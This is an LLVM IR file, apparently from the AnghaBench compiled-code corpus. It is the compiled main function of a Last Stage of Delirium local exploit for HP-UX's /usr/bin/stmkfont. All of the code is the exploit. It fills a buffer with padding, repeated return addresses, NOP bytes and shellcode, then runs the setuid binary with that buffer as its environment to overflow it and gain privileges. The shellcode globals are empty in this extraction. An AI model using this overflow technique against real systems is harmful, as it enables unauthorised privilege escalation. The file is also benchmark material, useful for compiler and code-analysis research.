; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hp-ux/local/extr_22246.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hp-ux/local/extr_22246.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM jun 2002 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [43 x i8] c"/usr/bin/stmkfont for HP-UX 10.20 700/800\0A\00", align 1
@jump = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [6 x i8] c"0x%x\0A\00", align 1
@PADNUM = common dso_local global i32 0, align 4
@ADRNUM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [5 x i8] c"lsd=\00", align 1
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@shellcode = common dso_local global i32* null, align 8
@.str.4 = private unnamed_addr constant [18 x i8] c"/usr/bin/stmkfont\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [20000 x i8], align 16
  %7 = alloca [4 x i8], align 1
  %8 = alloca i8*, align 8
  %9 = alloca [2 x i8*], align 16
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.1, i64 0, i64 0))
  %13 = load i64, i64* @jump, align 8
  %14 = inttoptr i64 %13 to i64 (...)*
  %15 = call i64 (...) %14()
  %16 = sub i64 %15, 16732
  %17 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %18 = bitcast i8* %17 to i64*
  store i64 %16, i64* %18, align 1
  %19 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %20 = bitcast i8* %19 to i64*
  %21 = load i64, i64* %20, align 1
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i64 %21)
  %23 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 2000
  %24 = getelementptr inbounds [2 x i8*], [2 x i8*]* %9, i64 0, i64 0
  store i8* %23, i8** %24, align 16
  %25 = getelementptr inbounds [2 x i8*], [2 x i8*]* %9, i64 0, i64 1
  store i8* null, i8** %25, align 8
  %26 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  store i8* %26, i8** %8, align 8
  store i32 0, i32* %10, align 4
  br label %27

27:                                               ; preds = %34, %2
  %28 = load i32, i32* %10, align 4
  %29 = load i32, i32* @PADNUM, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %37

31:                                               ; preds = %27
  %32 = load i8*, i8** %8, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %8, align 8
  store i8 97, i8* %32, align 1
  br label %34

34:                                               ; preds = %31
  %35 = load i32, i32* %10, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %10, align 4
  br label %27

37:                                               ; preds = %27
  store i32 0, i32* %10, align 4
  br label %38

38:                                               ; preds = %50, %37
  %39 = load i32, i32* %10, align 4
  %40 = load i32, i32* @ADRNUM, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %53

42:                                               ; preds = %38
  %43 = load i32, i32* %10, align 4
  %44 = srem i32 %43, 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = load i8*, i8** %8, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %8, align 8
  store i8 %47, i8* %48, align 1
  br label %50

50:                                               ; preds = %42
  %51 = load i32, i32* %10, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %10, align 4
  br label %38

53:                                               ; preds = %38
  %54 = load i8*, i8** %8, align 8
  store i8 0, i8* %54, align 1
  %55 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 2000
  store i8* %55, i8** %8, align 8
  %56 = load i8*, i8** %8, align 8
  %57 = call i32 @strcpy(i8* %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %58 = load i8*, i8** %8, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 4
  store i8* %59, i8** %8, align 8
  store i32 0, i32* %10, align 4
  br label %60

60:                                               ; preds = %74, %53
  %61 = load i32, i32* %10, align 4
  %62 = load i32, i32* @NOPNUM, align 4
  %63 = icmp slt i32 %61, %62
  br i1 %63, label %64, label %77

64:                                               ; preds = %60
  %65 = load i32*, i32** @nop, align 8
  %66 = load i32, i32* %10, align 4
  %67 = srem i32 %66, 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i32, i32* %65, i64 %68
  %70 = load i32, i32* %69, align 4
  %71 = trunc i32 %70 to i8
  %72 = load i8*, i8** %8, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %8, align 8
  store i8 %71, i8* %72, align 1
  br label %74

74:                                               ; preds = %64
  %75 = load i32, i32* %10, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %10, align 4
  br label %60

77:                                               ; preds = %60
  store i32 0, i32* %10, align 4
  br label %78

78:                                               ; preds = %92, %77
  %79 = load i32, i32* %10, align 4
  %80 = load i32*, i32** @shellcode, align 8
  %81 = call i32 @strlen(i32* %80)
  %82 = icmp slt i32 %79, %81
  br i1 %82, label %83, label %95

83:                                               ; preds = %78
  %84 = load i32*, i32** @shellcode, align 8
  %85 = load i32, i32* %10, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i32, i32* %84, i64 %86
  %88 = load i32, i32* %87, align 4
  %89 = trunc i32 %88 to i8
  %90 = load i8*, i8** %8, align 8
  %91 = getelementptr inbounds i8, i8* %90, i32 1
  store i8* %91, i8** %8, align 8
  store i8 %89, i8* %90, align 1
  br label %92

92:                                               ; preds = %83
  %93 = load i32, i32* %10, align 4
  %94 = add nsw i32 %93, 1
  store i32 %94, i32* %10, align 4
  br label %78

95:                                               ; preds = %78
  %96 = load i8*, i8** %8, align 8
  store i8 0, i8* %96, align 1
  %97 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  %98 = getelementptr inbounds [2 x i8*], [2 x i8*]* %9, i64 0, i64 0
  %99 = call i32 @execle(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0), i8* %97, i32 0, i8** %98)
  %100 = load i32, i32* %3, align 4
  ret i32 %100
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
